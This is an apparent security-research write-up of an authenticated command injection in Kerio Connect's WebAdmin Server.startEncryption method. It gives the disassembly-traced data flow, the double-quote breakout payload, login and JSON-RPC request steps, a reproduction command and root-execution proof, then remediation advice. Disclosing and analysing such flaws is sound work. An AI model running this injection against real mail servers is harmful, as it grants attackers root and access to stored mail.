# Kerio Connect Server.startEncryption Command Injection Authenticated RCE — Full Technical Analysis

## Product Background

- **Vendor**: GFI Software
- **Product**: Kerio Connect 10.0.9 Patch 2 (build 10320)
- **Category**: mail server (SMTP/IMAP/POP3, WebMail, groupware)
- **Stack**: C++ mailserver binary (69MB ELF x86-64, not stripped, 157,119 symbols); WebAdmin HTTPS on 4040
- **Deployment**: containerized; mailserver process runs as **root**
- **License**: WebAdmin functionality requires no license (mail protocols/WebMail/EWS are license-gated)

## Stage 0 — Prerequisites / Authentication Boundary

### Deployment

DEB install under the mailserver home; the first-run wizard completed: admin `admin` / `Admin123456!`, `isConfigWizardDone=true`. The mailserver process runs as root.

### WebAdmin Authentication (reverse-engineered)

| Item | Value |
|---|---|
| Entry | HTTPS 4040 (only non-license HTTP entry) |
| Login | FORM POST `/admin/login/dologin` (fields: `kerio_username`/`kerio_password`/`kerio_csrf_token`) |
| Session | `SESSION_CONNECT_WEBADMIN` cookie |
| CSRF | double-submit cookie `TOKEN_CONNECT_WEBADMIN` (form: `kerio_csrf_token`; JSON-RPC: `X-Token` header) |
| JSON-RPC | POST `/admin/api/jsonrpc/`, Content-Type/Accept `application/json-rpc`, X-Token header |
| Post-auth role | FullAdmin (`Session.whoAmI` confirms), 74 admin JSON-RPC methods callable |

### Auth boundary conclusion

`Server.startEncryption` requires FullAdmin auth (anonymous call returns `-32001 "User Anonymous does not have administrator rights"`). This is **Target B (authenticated RCE)**. WebAdmin does not require a license.

## Stage 1 — Sink Identification (`system()` in `formatVolume`)

### Toolchain

The 69MB C++ ELF cannot be fully analyzed with r2ghidra `aaa` (OOM under 2GB RAM). Approach: `objdump -d -M intel` full disassembly (686MB, 10,599,661 lines), `nm | c++filt` for symbol addresses, Python ELF parser for rodata string literals.

### Sink location

`formatVolume` (address `0x1e36ba0`) calls `system@plt` (`0x4300f0`) at offset `@1e36c95`:

```
formatVolume (0x1e36ba0)
  ...
  1e36c95:  callq  4300f0 <system@plt>
```

`system()` invokes `/bin/sh -c <cmdstring>`; any shell metacharacter (`"`, `;`, `$`, backtick, `|`, `&`) in the command string is interpreted by the shell. This is a CWE-78 command-injection sink.

### rodata string literals

| VA | Literal |
|---|---------|
| `0x2c2a53c` | `echo -n "` |
| `0x2c2a546` | `" \| ` |
| `0x2c2a54b` | `cryptsetup ` |
| `0x2c2a557` | ` luksFormat ` |

### Constructed command string

`formatVolume(dev, password)` builds with raw `std::string` concatenation (no escaping):

```
echo -n "<PASSWORD>" | cryptsetup ... luksFormat <DEVICE>
```

The whole string goes to `system()`. `<PASSWORD>` is the user-controlled `password` parameter, wrapped in double quotes with no escaping of `"`/`$`/backtick/`\` etc.

## Stage 2 — Source Identification (`Server.startEncryption` password param)

### JSON-RPC registration

`Server.startEncryption` is a WebAdmin JSON-RPC method (namespace `Server`). Front-end `advancedOptions.js` confirms the signature:

```javascript
method: "Server.startEncryption",
params: { password: <user input> }
```

### C++ Adapter

`ServerAdapter::startEncryption` (address `0x2615d60`) is the JSON-RPC entry adapter; it extracts the user-controlled `password` field from `params` and forwards it downstream.

## Stage 3 — Data Flow (full call chain, each hop disassembly-confirmed)

```
[Source] Server.startEncryption({password})                          // JSON-RPC, FullAdmin-controlled
   │
   ▼
ServerAdapter::startEncryption (0x2615d60)                           // extracts password
   │
   ▼
ServerManService::startEncryption (0x7c3960)                         // service layer
   │
   ▼
ServerManFacade::startEncryption (0xf53ae0)                          // facade layer
   │
   ▼
CDataEncrypter::startEncrypt(password) (0x1e34410)                   // encryption starter
   │
   ▼
createMountVolume (0x1e3b480)                                        // calls formatVolume 2x
   │
   ▼
formatVolume(dev, password) (0x1e36ba0)                              // ★ command construction
   │   builds: echo -n "<password>" | cryptsetup ... luksFormat <dev>
   │   (raw std::string concat, no escaping)
   │
   ▼
[Sink] system@plt (0x4300f0) @1e36c95                                // ★ system() executes
```

**Conclusion**: the user-controlled `password` flows from JSON-RPC Source to `formatVolume` with no filter/sanitizer/allowlist.

## Stage 4 — Injection / Exploitation Construction

### Double-quote breakout

Injected `PASSWORD = ";<CMD>;echo "`:

```
echo -n "";<CMD>;echo "" | cryptsetup ... luksFormat <dev>
```

- First `"` closes the opening quote of `echo -n "`
- `;` ends the `echo -n ""` command
- `<CMD>` executes as a standalone command
- `;echo "` starts a new echo (absorbs the trailing `" | cryptsetup ...`, avoiding a syntax error that would make the shell reject the whole command)
- `cryptsetup` fails afterwards (not installed in the container) without affecting the already-executed CMD

### Payload

```
password = ";id>/tmp/kerio_rce_PROOF;echo "
```

### Async execution

`Server.startEncryption` returns `action:'encrypting'`; `formatVolume`/`system()` runs asynchronously on a worker thread (~60s later: LVM checks, device prep, then `formatVolume`). Wait ~60s before reading the marker.

## Stage 5 — Dynamic Verification (fresh markers, airtight)

### Environment

Target: container WebAdmin HTTPS 4040; version 10.0.9 Patch 2; creds `admin`/`Admin123456!` (FullAdmin); date 2026-08-10.

### RUN 1 — `id` marker

1. GET `/admin/login/` for CSRF cookie
2. FORM POST `/admin/login/dologin` (admin/Admin123456!) → `SESSION_CONNECT_WEBADMIN` + `TOKEN_CONNECT_WEBADMIN`
3. POST `/admin/api/jsonrpc/` `Server.startEncryption` with `password = ";id>/tmp/kerio_rce_PROOF;echo "` + X-Token

JSON-RPC response:
```json
{ "jsonrpc": "2.0", "id": 1, "result": { "status": "decrypted", "action": "encrypting",
  "error": { "code": 0, "message": "", "need": 0 },
  "progress": { "current": 0, "total": 0 } } }
```

After ~60s, marker on target:
```
uid=0(root) gid=0(root) groups=0(root)
```
owner = root:root.

### RUN 2 — unique sentinel (excludes leftover)

Injected: `echo KERIO_PROVEN_$(whoami)_SENT2>/tmp/kerio_rce_SENT2`
Result: `KERIO_PROVEN_root_SENT2` — the `$(whoami)` expanded to `root` in the shell; a unique sentinel that cannot pre-exist a container restart. Confirms injection ran in the root context.

### encryption.log corroboration

`/opt/kerio/mailserver/store/logs/encryption.log` records the actual `system()` run:
```
"cryptsetup  luksFormat /var/etc/kerio/mailserver/luks.container": 32512
```
exit 32512 = command not found (no cryptsetup in container), but the injected CMD already ran earlier in the same shell (semicolon-separated).

### Adversarial verification

Two subagents: falsification agent NOT REFUTED (confidence 0.92, 5 dimensions: artifact check / sanitization check / default-config reachability / credential scoping / install-wizard check); independent re-analysis agent CONFIRMED.

**Target B authenticated root RCE confirmed.**

## Stage 6 — Reachability

- **Remote**: 4040 WebAdmin is the product's default admin port, reachable by remote attackers via direct HTTPS POST; no MITM prerequisite
- **Auth**: FullAdmin credentials required; `admin/Admin123456!` is set by the install wizard (user-defined, not hardcoded)
- **License**: WebAdmin works without a license
- **Prerequisites**: FullAdmin creds + reachable 4040 + server in `decrypted` state (if already encrypted, decrypt first via `Server.stopEncryption`)

## Stage 7 — Defense in Depth / Remediation

1. **Avoid shell invocation**: use `execvp`/`posix_spawn` to run `cryptsetup` directly with argv (not a shell string); pass the password via stdin (cryptsetup supports stdin)
2. **If shell required**: strictly escape `"`/`$`/backtick/`\`/`;`/`|`/`&` (single-quote wrap + internal quote escape) or enforce an allowlist
3. **Least privilege**: mailserver should not run as root; encryption ops should drop to a dedicated low-privilege account

### Impact

- Authenticated root RCE (FullAdmin → root shell)
- Chainable: RCE → read `mailserver.cfg` → read mail store → lateral movement

## Reproduction

```bash
# run exploit (stdlib-only Python)
python3 exploit.py 127.0.0.1 4040 admin 'Admin123456!' 'id>/tmp/kerio_rce_PROOF'
# wait ~60s for the async system() execution, then verify the marker
```

## CWE / CVSS

- CWE-78 (OS Command Injection) — `system()` + unsanitized user input in a shell string
- **CVSS 3.1**: ≈ 8.8 (AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H) — PR:H because FullAdmin credentials are required
